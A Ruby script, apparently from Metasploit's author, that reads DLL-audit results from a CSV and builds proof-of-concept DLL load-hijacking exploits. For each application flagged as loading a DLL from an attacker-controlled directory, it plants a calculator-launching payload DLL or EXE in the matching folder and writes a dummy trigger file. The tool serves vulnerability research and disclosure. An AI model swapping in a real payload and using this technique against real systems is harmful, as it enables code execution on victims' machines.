#!ruby

# DLL Load Hijacking PoC generator - <hdm[at]metasploit.com>

require 'fileutils'
require 'csv'

def print_status(msg)
	$stdout.puts "[*] #{msg}"
end

base = File.expand_path(File.dirname(__FILE__))

csv = ARGV.shift || File.join(base, "results.csv")
cnt = 0

app_idx = 1
inf_idx = 4

apps = {}
rows = File.readlines(csv).map{|x| x.gsub("\"", '').split(",") }
head = rows.shift

head.each_index do |i|
	if head[i].index("Process Name")
		app_idx = i
	end

	if head[i].index("Path")
		inf_idx = i
	end
end

rows.each do |row|
	cnt += 1

	app = row[app_idx].downcase
	inf = row[inf_idx].downcase

	if inf =~ /dllaudit\\ext\\([^\\]+)\\(.*)/#/
		ext = $1
		tgt = $2

		tgt.gsub!("[", "")
		tgt.gsub!("]", "")
		tgt.gsub!("\"", "")

		apps[app] ||= {}
		apps[app]["#{ext}-#{tgt}"] = [ext, tgt]
	end
end

apps.delete("cmd.exe")
apps.delete("ruby.exe")

appdir = File.join(base, "exploits")
FileUtils.mkdir_p(appdir)

apps.keys.each do |app|
	print_status "#{app}"	
	apps[app].keys.each do |r|
begin
		dllpath = apps[app][r][1]
		bits = dllpath.split("\\")
		file = bits.pop
		path = bits.join("/")

		payload = "runcalc.dll"
		if file =~ /\.(exe|scr)/i
			payload = "runcalc.exe"
		end
		
		FileUtils.mkdir_p(File.join(appdir, path))
		FileUtils.cp(File.join(base, payload), File.join(appdir,path,file))
		File.open(File.join(appdir, "exploit.#{apps[app][r][0]}"), "w") do |fd|
			fd.write("HOWDY!")
		end
		print_status "\t#{apps[app][r][0]}\t#{apps[app][r][1]}"
rescue ::Exception => e
end
	end
end
